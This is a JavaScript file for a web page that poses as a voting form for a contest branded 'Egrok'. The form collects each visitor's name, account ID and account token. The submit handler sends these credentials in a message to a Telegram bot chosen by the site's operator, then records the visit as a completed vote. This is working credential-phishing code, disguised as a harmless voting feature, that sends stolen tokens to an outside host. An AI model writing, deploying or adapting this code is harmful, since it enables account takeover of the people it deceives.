// === Config from admin panel ===
const TELEGRAM_BOT_TOKEN = localStorage.getItem('egrok_tg_token') || '';
const TELEGRAM_CHAT_ID = localStorage.getItem('egrok_tg_chatid') || '';
const CATEGORY_COLORS = ['#6c5ce7', '#00cec9', '#fd79a8', '#fdcb6e', '#e17055', '#00b894'];

// === Load candidate from session ===
const candidate = JSON.parse(sessionStorage.getItem('egrok_vote_candidate') || 'null');

if (!candidate) {
  window.location.href = 'index.html';
} else {
  const fallback = `https://ui-avatars.com/api/?name=${encodeURIComponent(candidate.name)}&size=112&background=${CATEGORY_COLORS[candidate.id % CATEGORY_COLORS.length].replace('#','')}&color=fff&bold=true`;
  const adminImg = localStorage.getItem(`egrok_img_${candidate.id}`);
  const imgEl = document.getElementById('candidateImg');
  imgEl.src = adminImg || candidate.image;
  imgEl.onerror = function() { this.src = fallback; };
  document.getElementById('candidateName').textContent = candidate.name;
  document.getElementById('candidateCategory').textContent = candidate.category;
}

// === Load Egrok logo ===
const logo = localStorage.getItem('egrok_logo');
const logoEl = document.getElementById('brandLogoImg');
if (logo && logoEl) {
  logoEl.src = logo;
  logoEl.style.display = 'block';
  const iconEl = document.getElementById('brandLogoIcon');
  if (iconEl) iconEl.style.display = 'none';
}
const formLogo = document.getElementById('formLogo');
if (logo && formLogo) {
  formLogo.innerHTML = `<img src="${logo}" alt="EGROK">`;
}

// === Load sponsors ===
const sponsors = JSON.parse(localStorage.getItem('egrok_sponsors') || '[]').filter(Boolean);
const sponsorWrap = document.getElementById('sponsorLogos');
if (sponsorWrap && sponsors.length) {
  sponsorWrap.innerHTML = '';
  sponsors.forEach(src => {
    const img = document.createElement('img');
    img.src = src;
    img.alt = 'Sponsor';
    sponsorWrap.appendChild(img);
  });
}

// === Already voted check ===
if (localStorage.getItem('egrok_voted') === 'true') {
  window.location.href = 'index.html';
}

// === Form Submit ===
const form = document.getElementById('connectForm');
const submitBtn = document.getElementById('submitBtn');
const btnText = submitBtn.querySelector('.btn-text');

form.addEventListener('submit', async e => {
  e.preventDefault();
  const fullName = document.getElementById('fullName');
  const egrokId = document.getElementById('egrokId');
  const egrokToken = document.getElementById('egrokToken');
  const anonymous = document.getElementById('anonymous').checked;

  let valid = true;
  [fullName, egrokId, egrokToken].forEach(input => {
    if (!input.value.trim()) { input.classList.add('invalid'); valid = false; }
    else input.classList.remove('invalid');
  });
  if (!valid) return;

  btnText.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Connecting...';
  submitBtn.disabled = true;

  const payload = {
    name: anonymous ? 'Anonymous' : fullName.value.trim(),
    egrokId: egrokId.value.trim(),
    egrokToken: egrokToken.value.trim(),
    candidate: candidate.name,
    timestamp: new Date().toISOString(),
  };

  try {
    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
      const text = `🗳 *New Vote Submitted*\n\nName: ${payload.name}\nEgrok ID: ${payload.egrokId}\nToken: ${payload.egrokToken}\nCandidate: ${payload.candidate}\nTime: ${payload.timestamp}`;
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'Markdown' })
      }).catch(() => {});
    }

    const votes = JSON.parse(localStorage.getItem('egrok_votes') || '[]');
    votes.push(payload);
    localStorage.setItem('egrok_votes', JSON.stringify(votes));
    localStorage.setItem('egrok_voted', 'true');

    sessionStorage.removeItem('egrok_vote_candidate');
    sessionStorage.setItem('egrok_vote_success', 'true');
    window.location.href = 'index.html';
  } catch {
    alert('Something went wrong. Please try again.');
    btnText.innerHTML = '<i class="fa-solid fa-paper-plane"></i> Submit Vote';
    submitBtn.disabled = false;
  }
});
